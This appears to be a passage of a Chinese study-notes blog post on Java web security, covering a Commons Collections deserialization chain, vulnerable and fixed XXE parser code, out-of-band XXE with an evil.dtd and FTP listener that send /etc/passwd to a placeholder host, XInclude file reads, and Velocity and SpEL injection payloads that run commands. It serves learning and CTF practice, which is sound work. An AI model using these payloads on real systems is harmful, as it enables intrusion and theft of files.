import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class exp {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(&quot;getMethod&quot;, new Class[] {String.class, Class[].class}, new Object[] {&quot;getRuntime&quot;, new Class[0]}),
                new InvokerTransformer(&quot;invoke&quot;, new Class[] {Object.class, Object[].class}, new Object[] {null, new Object[0]}),
                new InvokerTransformer(&quot;exec&quot;, new Class[] {String.class}, new Object[] {&quot;calc&quot;}),
                new ConstantTransformer(&quot;1&quot;)
        };
        Transformer transformChain = new ChainedTransformer(transformers);

        Map innerMap = new HashMap();
        Map lazyMap = LazyMap.decorate(innerMap, transformChain);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, &quot;foo233&quot;);

        BadAttributeValueExpException exception = new BadAttributeValueExpException(null);
        Field valField = exception.getClass().getDeclaredField(&quot;val&quot;);
        valField.setAccessible(true);
        valField.set(exception, entry);

        File f = new File(&quot;poc&quot;);
        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
        out.writeObject(exception);
        out.flush();
        out.close();

        ObjectInputStream in = new ObjectInputStream(new FileInputStream(&quot;poc&quot;));
        in.readObject();  // 触发漏洞
        in.close();
    }
}</code></pre>
<p>done.</p>
<ul>
<li>防御机制</li>
</ul>
<p>从demo的安全代码部分就能看出。使用了AntObjectInputStream与InvalidClassException来进行黑/白名单的防范。具体可以看其自定义的代码 <a href="https://github.com/JoyChou93/java-sec-code/blob/master/src/main/java/org/joychou/security/AntObjectInputStream.java" target="_blank" rel="noopener">https://github.com/JoyChou93/java-sec-code/blob/master/src/main/java/org/joychou/security/AntObjectInputStream.java</a><br>直接Hook java/io/ObjectInputStream类的resolveClass方法</p>
<p>//今天先写这么多吧,好久没写java写起来还挺怀念的。</p>
<h3 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h3><p>XXE在java-sec-code项目中被分为了两个部分。普通XXE与POI ooxml XXE.我们先从基础的看起。</p>
<pre><code class="java">
package org.joychou.controller;

import org.dom4j.DocumentHelper;
import org.dom4j.io.SAXReader;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.web.bind.annotation.*;

import javax.servlet.http.HttpServletRequest;

import org.w3c.dom.Document;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;
import org.xml.sax.helpers.XMLReaderFactory;
import org.xml.sax.XMLReader;

import java.io.*;

import org.xml.sax.InputSource;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.SAXParserFactory;
import javax.xml.parsers.SAXParser;

import org.xml.sax.helpers.DefaultHandler;
import org.apache.commons.digester3.Digester;
import org.jdom2.input.SAXBuilder;
import org.joychou.util.WebUtils;

/**
 * Java xxe vuln and security code.
 *
 * @author JoyChou @2017-12-22
 */

@RestController
@RequestMapping(&quot;/xxe&quot;)
public class XXE {

    private static Logger logger = LoggerFactory.getLogger(XXE.class);
    private static String EXCEPT = &quot;xxe except&quot;;

    @PostMapping(&quot;/xmlReader/vuln&quot;)
    public String xmlReaderVuln(HttpServletRequest request) {
        try {
            String body = WebUtils.getRequestBody(request);
            logger.info(body);
            XMLReader xmlReader = XMLReaderFactory.createXMLReader();
            xmlReader.parse(new InputSource(new StringReader(body)));  // parse xml
            return &quot;xmlReader xxe vuln code&quot;;
        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }
    }


    @RequestMapping(value = &quot;/xmlReader/sec&quot;, method = RequestMethod.POST)
    public String xmlReaderSec(HttpServletRequest request) {
        try {
            String body = WebUtils.getRequestBody(request);
            logger.info(body);

            XMLReader xmlReader = XMLReaderFactory.createXMLReader();
            // fix code start
            xmlReader.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);
            xmlReader.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);
            xmlReader.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);
            //fix code end
            xmlReader.parse(new InputSource(new StringReader(body)));  // parse xml

        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }

        return &quot;xmlReader xxe security code&quot;;
    }


    @RequestMapping(value = &quot;/SAXBuilder/vuln&quot;, method = RequestMethod.POST)
    public String SAXBuilderVuln(HttpServletRequest request) {
        try {
            String body = WebUtils.getRequestBody(request);
            logger.info(body);

            SAXBuilder builder = new SAXBuilder();
            // org.jdom2.Document document
            builder.build(new InputSource(new StringReader(body)));  // cause xxe
            return &quot;SAXBuilder xxe vuln code&quot;;
        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }
    }

    @RequestMapping(value = &quot;/SAXBuilder/sec&quot;, method = RequestMethod.POST)
    public String SAXBuilderSec(HttpServletRequest request) {
        try {
            String body = WebUtils.getRequestBody(request);
            logger.info(body);

            SAXBuilder builder = new SAXBuilder();
            builder.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);
            builder.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);
            builder.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);
            // org.jdom2.Document document
            builder.build(new InputSource(new StringReader(body)));

        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }

        return &quot;SAXBuilder xxe security code&quot;;
    }

    @RequestMapping(value = &quot;/SAXReader/vuln&quot;, method = RequestMethod.POST)
    public String SAXReaderVuln(HttpServletRequest request) {
        try {
            String body = WebUtils.getRequestBody(request);
            logger.info(body);

            SAXReader reader = new SAXReader();
            // org.dom4j.Document document
            reader.read(new InputSource(new StringReader(body))); // cause xxe

        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }

        return &quot;SAXReader xxe vuln code&quot;;
    }

    @RequestMapping(value = &quot;/SAXReader/sec&quot;, method = RequestMethod.POST)
    public String SAXReaderSec(HttpServletRequest request) {
        try {
            String body = WebUtils.getRequestBody(request);
            logger.info(body);

            SAXReader reader = new SAXReader();
            reader.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);
            reader.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);
            reader.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);
            // org.dom4j.Document document
            reader.read(new InputSource(new StringReader(body)));
        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }
        return &quot;SAXReader xxe security code&quot;;
    }

    @RequestMapping(value = &quot;/SAXParser/vuln&quot;, method = RequestMethod.POST)
    public String SAXParserVuln(HttpServletRequest request) {
        try {
            String body = WebUtils.getRequestBody(request);
            logger.info(body);

            SAXParserFactory spf = SAXParserFactory.newInstance();
            SAXParser parser = spf.newSAXParser();
            parser.parse(new InputSource(new StringReader(body)), new DefaultHandler());  // parse xml

            return &quot;SAXParser xxe vuln code&quot;;
        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }
    }


    @RequestMapping(value = &quot;/SAXParser/sec&quot;, method = RequestMethod.POST)
    public String SAXParserSec(HttpServletRequest request) {
        try {
            String body = WebUtils.getRequestBody(request);
            logger.info(body);

            SAXParserFactory spf = SAXParserFactory.newInstance();
            spf.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);
            spf.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);
            spf.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);
            SAXParser parser = spf.newSAXParser();
            parser.parse(new InputSource(new StringReader(body)), new DefaultHandler());  // parse xml
        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }
        return &quot;SAXParser xxe security code&quot;;
    }


    @RequestMapping(value = &quot;/Digester/vuln&quot;, method = RequestMethod.POST)
    public String DigesterVuln(HttpServletRequest request) {
        try {
            String body = WebUtils.getRequestBody(request);
            logger.info(body);

            Digester digester = new Digester();
            digester.parse(new StringReader(body));  // parse xml
        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }
        return &quot;Digester xxe vuln code&quot;;
    }

    @RequestMapping(value = &quot;/Digester/sec&quot;, method = RequestMethod.POST)
    public String DigesterSec(HttpServletRequest request) {
        try {
            String body = WebUtils.getRequestBody(request);
            logger.info(body);

            Digester digester = new Digester();
            digester.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);
            digester.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);
            digester.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);
            digester.parse(new StringReader(body));  // parse xml

            return &quot;Digester xxe security code&quot;;
        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }
    }


    // 有回显
    @RequestMapping(value = &quot;/DocumentBuilder/vuln01&quot;, method = RequestMethod.POST)
    public String DocumentBuilderVuln01(HttpServletRequest request) {
        try {
            String body = WebUtils.getRequestBody(request);
            logger.info(body);
            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
            DocumentBuilder db = dbf.newDocumentBuilder();
            StringReader sr = new StringReader(body);
            InputSource is = new InputSource(sr);
            Document document = db.parse(is);  // parse xml

            // 遍历xml节点name和value
            StringBuilder buf = new StringBuilder();
            NodeList rootNodeList = document.getChildNodes();
            for (int i = 0; i &lt; rootNodeList.getLength(); i++) {
                Node rootNode = rootNodeList.item(i);
                NodeList child = rootNode.getChildNodes();
                for (int j = 0; j &lt; child.getLength(); j++) {
                    Node node = child.item(j);
                    buf.append(String.format(&quot;%s: %s\n&quot;, node.getNodeName(), node.getTextContent()));
                }
            }
            sr.close();
            return buf.toString();
        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }
    }


    // 有回显
    @RequestMapping(value = &quot;/DocumentBuilder/vuln02&quot;, method = RequestMethod.POST)
    public String DocumentBuilderVuln02(HttpServletRequest request) {
        try {
            String body = WebUtils.getRequestBody(request);
            logger.info(body);

            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
            DocumentBuilder db = dbf.newDocumentBuilder();
            StringReader sr = new StringReader(body);
            InputSource is = new InputSource(sr);
            Document document = db.parse(is);  // parse xml

            // 遍历xml节点name和value
            StringBuilder result = new StringBuilder();
            NodeList rootNodeList = document.getChildNodes();
            for (int i = 0; i &lt; rootNodeList.getLength(); i++) {
                Node rootNode = rootNodeList.item(i);
                NodeList child = rootNode.getChildNodes();
                for (int j = 0; j &lt; child.getLength(); j++) {
                    Node node = child.item(j);
                    // 正常解析XML，需要判断是否是ELEMENT_NODE类型。否则会出现多余的的节点。
                    if (child.item(j).getNodeType() == Node.ELEMENT_NODE) {
                        result.append(String.format(&quot;%s: %s\n&quot;, node.getNodeName(), node.getFirstChild()));
                    }
                }
            }
            sr.close();
            return result.toString();
        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }
    }


    @RequestMapping(value = &quot;/DocumentBuilder/Sec&quot;, method = RequestMethod.POST)
    public String DocumentBuilderSec(HttpServletRequest request) {
        try {
            String body = WebUtils.getRequestBody(request);
            logger.info(body);

            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
            dbf.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);
            dbf.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);
            dbf.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);
            DocumentBuilder db = dbf.newDocumentBuilder();
            StringReader sr = new StringReader(body);
            InputSource is = new InputSource(sr);
            db.parse(is);  // parse xml
            sr.close();
        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }
        return &quot;DocumentBuilder xxe security code&quot;;
    }


    @RequestMapping(value = &quot;/DocumentBuilder/xinclude/vuln&quot;, method = RequestMethod.POST)
    public String DocumentBuilderXincludeVuln(HttpServletRequest request) {
        try {
            String body = WebUtils.getRequestBody(request);
            logger.info(body);

            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
            dbf.setXIncludeAware(true);   // 支持XInclude
            dbf.setNamespaceAware(true);  // 支持XInclude
            DocumentBuilder db = dbf.newDocumentBuilder();
            StringReader sr = new StringReader(body);
            InputSource is = new InputSource(sr);
            Document document = db.parse(is);  // parse xml

            NodeList rootNodeList = document.getChildNodes();
            response(rootNodeList);

            sr.close();
            return &quot;DocumentBuilder xinclude xxe vuln code&quot;;
        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }
    }


    @RequestMapping(value = &quot;/DocumentBuilder/xinclude/sec&quot;, method = RequestMethod.POST)
    public String DocumentBuilderXincludeSec(HttpServletRequest request) {
        try {
            String body = WebUtils.getRequestBody(request);
            logger.info(body);
            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();

            dbf.setXIncludeAware(true);   // 支持XInclude
            dbf.setNamespaceAware(true);  // 支持XInclude
            dbf.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);
            dbf.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);
            dbf.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);

            DocumentBuilder db = dbf.newDocumentBuilder();
            StringReader sr = new StringReader(body);
            InputSource is = new InputSource(sr);
            Document document = db.parse(is);  // parse xml

            NodeList rootNodeList = document.getChildNodes();
            response(rootNodeList);

            sr.close();
        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }
        return &quot;DocumentBuilder xinclude xxe vuln code&quot;;
    }


    @PostMapping(&quot;/XMLReader/vuln&quot;)
    public String XMLReaderVuln(HttpServletRequest request) {
        try {
            String body = WebUtils.getRequestBody(request);
            logger.info(body);

            SAXParserFactory spf = SAXParserFactory.newInstance();
            SAXParser saxParser = spf.newSAXParser();
            XMLReader xmlReader = saxParser.getXMLReader();
            xmlReader.parse(new InputSource(new StringReader(body)));

        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }

        return &quot;XMLReader xxe vuln code&quot;;
    }


    @PostMapping(&quot;/XMLReader/sec&quot;)
    public String XMLReaderSec(HttpServletRequest request) {
        try {
            String body = WebUtils.getRequestBody(request);
            logger.info(body);

            SAXParserFactory spf = SAXParserFactory.newInstance();
            SAXParser saxParser = spf.newSAXParser();
            XMLReader xmlReader = saxParser.getXMLReader();
            xmlReader.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);
            xmlReader.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);
            xmlReader.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);
            xmlReader.parse(new InputSource(new StringReader(body)));

        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }
        return &quot;XMLReader xxe security code&quot;;
    }


    /**
     * 修复该漏洞只需升级dom4j到2.1.1及以上，该版本及以上禁用了ENTITY；
     * 不带ENTITY的PoC不能利用，所以禁用ENTITY即可完成修复。
     */
    @PostMapping(&quot;/DocumentHelper/vuln&quot;)
    public String DocumentHelper(HttpServletRequest req) {
        try {
            String body = WebUtils.getRequestBody(req);
            DocumentHelper.parseText(body); // parse xml
        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }

        return &quot;DocumentHelper xxe vuln code&quot;;
    }


    private static void response(NodeList rootNodeList){
        for (int i = 0; i &lt; rootNodeList.getLength(); i++) {
            Node rootNode = rootNodeList.item(i);
            NodeList xxe = rootNode.getChildNodes();
            for (int j = 0; j &lt; xxe.getLength(); j++) {
                Node xxeNode = xxe.item(j);
                // 测试不能blind xxe，所以强行加了一个回显
                logger.info(&quot;xxeNode: &quot; + xxeNode.getNodeValue());
            }

        }
    }

    public static void main(String[] args)  {
    }

}</code></pre>
<p>从上面的代码可以看出。可导致XXE的xml解析类有许多种。同时进行防范时大多是使用了<code>setFeature()</code>来把某个特性设置为true/false.</p>
<p>简单的内容同样不谈。这里关于javaxxe的几个特性稍微研究一下。先找个能回显的路由<code>/DocumentBuilder/vuln01</code></p>
<ul>
<li>java的xxe可列目录。</li>
</ul>
<p>file协议,netdoc协议均可</p>
<p><code>file:/ , netdoc:/</code>就能列根目录了。这点在某些写过滤大意的情况下可能会有帮助，比如只过滤了<code>file://</code>的情况。<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/8.PNG" class="lazyload" data-srcset="8.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
<p>这点曾经在某个比赛中遇到过。当时题目后端使用的是php。但是它有一个将xml节点渲染成图片并回显的功能。像这种功能的底部实现很有可能是java达成的。因此在不知道路径文件名读取源码时可以通过列目录解决问题。</p>
<ul>
<li>java的xxe不能读取多行的问题</li>
</ul>
<p>这个相比较php而言算是比较大的问题。php的伪协议为其读取方式带来了很大的便利,并且几乎是万金油。但是java的xxe有时读取不到多行完全是取决于jdk的版本并且普遍存在读取不了<code>&lt; %</code>的问题。</p>
<p>通常我们在盲打java oob xxe时普遍选择ftp协议(其实是因为支持的可外连的协议只有http/s ftp)。http只能读取单行文件。ftp则在不同版本下有不同表现<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/9.PNG" class="lazyload" data-srcset="9.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
<p>这里其他大佬普遍针对这个问题进行了研究<br><a href="https://landgrey.me/blog/9/" target="_blank" rel="noopener">https://landgrey.me/blog/9/</a><br><a href="https://www.leadroyal.cn/?p=914" target="_blank" rel="noopener">https://www.leadroyal.cn/?p=914</a><br>结论是:</p>
<blockquote>
<p>使用ftp 进行 oob 时，对版本有限制， &lt;7u141 和 &lt;8u162 才可以读取整个文件,全版本 http 都只可以读单行文件</p>
</blockquote>
<p>总之遇到问题先打上一发看看。这里放出ftpserver的ruby代码。因为vps端口问题我把端口改了</p>
<pre><code class="ruby">require &#39;socket&#39;
server = TCPServer.new 8001
loop do
  Thread.start(server.accept) do |client|
    puts &quot;New client connected&quot;
    data = &quot;&quot;
    client.puts(&quot;220 xxe-ftp-server&quot;)
    loop {
        req = client.gets()
        puts &quot;&lt; &quot;+req
        if req.include? &quot;USER&quot;
            client.puts(&quot;331 password please - version check&quot;)
        else
           #puts &quot;&gt; 230 more data please!&quot;
            client.puts(&quot;230 more data please!&quot;)
        end
    }
  end
end</code></pre>
<p><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/10.PNG" class="lazyload" data-srcset="10.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
<p>payload</p>
<pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE root [&lt;!ENTITY % remote SYSTEM &quot;http://xxxx/evil.dtd&quot;&gt;%remote;]&gt;
&lt;root/&gt;</code></pre>
<p>evil.dtd</p>
<pre><code class="xml">&lt;!ENTITY % payload SYSTEM &quot;file:///etc/passwd&quot;&gt;
&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; trick SYSTEM &#39;ftp://fakeuser:fakepass@xxxxxxxx:8001/%payload;&#39;&gt;&quot;&gt;
%int;
%trick</code></pre>
<p>当然以上针对的是OOB.也就是盲打外带的方法</p>
<ul>
<li>Xinclude xxe</li>
</ul>
<p>这点我倒是非常感兴趣。因为前不久的htb Quick这台靶机就用到了xinclude+xslt的RCE(没错,其实是引入通过外部xml达成RCE)</p>
<p>当然不是所有服务都能像Esigate那样有这么低级的错误。正常来说我们一般是可以尝试xxe读文件</p>
<pre><code class="xml">&lt;?xml version=&quot;1.0&quot; ?&gt;
&lt;root xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt;
 &lt;xi:include href=&quot;file:///etc/passwd&quot; parse=&quot;text&quot;/&gt;
&lt;/root&gt;</code></pre>
<p>对于php而言。不需要打开外部实体引用选项，也能使用xinclude读取本地文件。</p>
<p>这里顺便分享下htb 那里参考的文章。我认为其利用对于提升xxe作用这点是很有参考价值的。<a href="https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/" target="_blank" rel="noopener">https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/</a></p>
<p>总而言之,java进行xxe相比常见的php后端而言多了许多限制。但是可以列目录这点是关键。同时遇到要盲打时，ftp是最好的选择。防御上,使用setFeature就能让外部实体不被加载。</p>
<h3 id="ssti"><a href="#ssti" class="headerlink" title="ssti"></a>ssti</h3><p>Java的ssti相比较jinja等等而言还是很好理解的。只是对于不同框架应对手段不同</p>
<pre><code class="java">package org.joychou.controller;


import org.apache.velocity.VelocityContext;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import org.apache.velocity.app.Velocity;

import java.io.StringWriter;

@RestController
@RequestMapping(&quot;/ssti&quot;)
public class SSTI {

    /**
     * SSTI of Java velocity. The latest Velocity version still has this problem.
     * Fix method: Avoid to use Velocity.evaluate method.
     * &lt;p&gt;
     * http://localhost:8080/ssti/velocity?template=%23set($e=%22e%22);$e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22open%20-a%20Calculator%22)
     * Open a calculator in MacOS.
     *
     * @param template exp
     */
    @GetMapping(&quot;/velocity&quot;)
    public void velocity(String template) {
        Velocity.init();

        VelocityContext context = new VelocityContext();

        context.put(&quot;author&quot;, &quot;Elliot A.&quot;);
        context.put(&quot;address&quot;, &quot;217 E Broadway&quot;);
        context.put(&quot;phone&quot;, &quot;555-1337&quot;);

        StringWriter swOut = new StringWriter();
        Velocity.evaluate(context, swOut, &quot;test&quot;, template);
    }
}</code></pre>
<p>此处是一个Velocity的ssti。payload是<code>#set($e=&quot;e&quot;);$e.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;curl xxxx&quot;)</code></p>
<p>可以看出渲染的语句是<code>#</code>开头后接一个反射构造的命令执行payload.<code>$e</code>为字符串。因此后面就是从<code>java.lang.String</code>对象开始获取类，方法，执行命令。</p>
<p>这点上从某种角度与SpEL非常相似。当然后面做SpEL注入时再细讲。这里分享一个之前在SharkyCTF中遇到的Thymeleaf ssti。因为当时题目后端把各种命令执行都hook了,自己一直没能成功执行命令,虽然实际上不需要命令执行就能做,但是查资料的过程中也有了新的收获。</p>
<p><a href="https://ctftime.org/task/11563" target="_blank" rel="noopener">https://ctftime.org/task/11563</a></p>
<p>这题因为使用了Thymeleaf.加上我在使用<code>[[${7*7}]]</code>时返回了49。所以我认为是使用了<code>Thymeleaf</code>来进行渲染的。(Thymeleaf是通过两个中括号取值的)可惜题目底层hook的非常严,没能RCE。读文件的payload<br><code>[[${ new java.io.BufferReader(new java.io.FileReader(&quot;/etc/passwd&quot;)).readLine()}]]</code>都做不到。比赛结束后才发现要猜flag这个class的存在的,比较无语。但是从中我们也可以看出,java ssti其实就是判断出对应引擎后用接近于SpEL的思路来进行利用。否则就是利用题目环境中的class读取变量.</p>
<p>比赛中当时参考了这篇文章<a href="https://hawkinsecurity.com/2017/12/13/rce-via-spring-engine-ssti/" target="_blank" rel="noopener">https://hawkinsecurity.com/2017/12/13/rce-via-spring-engine-ssti/</a><br>其实仔细想想怎么看都是SpEL的意思……所以相关技巧还是留到下一篇SpEL讲吧。</p>
<h3 id="SpEL"><a href="#SpEL" class="headerlink" title="SpEL"></a>SpEL</h3><p>vuln code</p>
<pre><code class="java">package org.joychou.controller;

import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;


/**
 * SpEL Injection
 *
 * @author JoyChou @2019-01-17
 */
@RestController
public class SpEL {

    /**
     * SPEL to RCE
     * http://localhost:8080/spel/vul/?expression=xxx.
     * xxx is urlencode(exp)
     * exp: T(java.lang.Runtime).getRuntime().exec(&quot;curl xxx.ceye.io&quot;)
     */
    @GetMapping(&quot;/spel/vuln&quot;)
    public String rce(String expression) {
        ExpressionParser parser = new SpelExpressionParser();
        // fix method: SimpleEvaluationContext
        return parser.parseExpression(expression).getValue().toString();
    }

    public static void main(String[] args) {
        ExpressionParser parser = new SpelExpressionParser();
        String expression = &quot;T(java.lang.Runtime).getRuntime().exec(\&quot;open -a Calculator\&quot;)&quot;;
        String result = parser.parseExpression(expression).getValue().toString();
        System.out.println(result);
    }
}</code></pre>
<p>首先,SpEL表达式注入漏洞 是EL(expression language)的一种。之所以叫SpEL是因为它是应用在Spring框架中的。不过只要掌握了SpEL的相关知识，想必其他的表达式注入漏洞也能收手到擒来吧。</p>
<p>SpEL有许多特性：</p>
<ul>
<li>使用Bean的ID来引用Bean</li>
<li>可调用方法和访问对象的属性</li>
<li>可对值进行算数、关系和逻辑运算</li>
<li>可使用正则表达式进行匹配</li>
<li>可进行集合操作</li>
</ul>
<p>因此我认为上面一类java的ssti利用本质上还是在定界符中进行了表达式运算,所以了解表达式注入也就成为了重中之重。</p>
<p>首先是语法知识</p>
<ul>
<li>SpEL支持的定界符</li>
</ul>
<p><code>#{}</code></p>
<blockquote>
<p>引用其他对象:#{car}<br>引用其他对象的属性：#{car.brand}<br>调用其它方法 , 还可以链式操作：#{car.toString()}</p>
</blockquote>
<p>属性名称还可以使用<code>${xxxx}</code><br>此外还有一种使用T运算符,调用类作用域方法和常量<code>#{T(java.lang.Math)}</code>返回一个java.lang.Math对象</p>
<p>一般来说我们会把SpEL用在xml配置或者注解的使用中，这应该是是为了其动态性。除此之外就是直接用在代码块中进行expression.</p>
<p>导致SpEL注入的原因如下:</p>
<blockquote>
<p>SimpleEvaluationContext和StandardEvaluationContext是SpEL提供的两个EvaluationContext：<br>SimpleEvaluationContext - 针对不需要SpEL语言语法的全部范围并且应该受到有意限制的表达式类别，公开SpEL语言特性和配置选项的子集。<br>StandardEvaluationContext - 公开全套SpEL语言功能和配置选项。您可以使用它来指定默认的根对象并配置每个可用的评估相关策略。</p>
</blockquote>
<p>在不指定EvaluationContext的情况下默认采用的是StandardEvaluationContext，而它包含了SpEL的所有功能，在允许用户控制输入的情况下可以成功造成任意命令执行。</p>
<p>此处javasec的SpEL命令执行理论上只要使用</p>
<pre><code class="java">T(java.lang.Runtime).getRuntime().exec(&quot;curl xxx&quot;)</code></pre>
<p>即可。不过这里执行时总是不成功，有点迷。但是没有关系，毕竟无论比赛还是实战都不可能碰上没有waf的SpEL。这里干脆直接找其他的几个例子来试试<br>(其实懒得本地建个maven项目了，我自己爬)</p>
<ul>
<li>code-breaking javacon</li>
</ul>
<p>年初的题一直留到现在…就是为了学SpEL的这一天。</p>
<p>题目的源码jar下好后。老样子扔进lib里直接审计<br>结构:<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/11.PNG" class="lazyload" data-srcset="11.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>在配置application.xml中有这样的黑名单</p>
<pre><code>spring:
  thymeleaf:
    encoding: UTF-8
    cache: false
    mode: HTML
keywords:
  blacklist:
    - java.+lang
    - Runtime
    - exec.*\(
user:
  username: admin
  password: admin
  rememberMeKey: c0dehack1nghere1</code></pre><p>显然是限制了Runtime.exec的命令执行。但是实际上这个waf真的非常友好了…</p>
<p>再来看主体源码</p>
<pre><code class="java">package io.tricking.challenge;

import io.tricking.challenge.spel.SmallEvaluationContext;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.expression.Expression;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.ParserContext;
import org.springframework.expression.common.TemplateParserContext;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.http.HttpStatus;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.CookieValue;
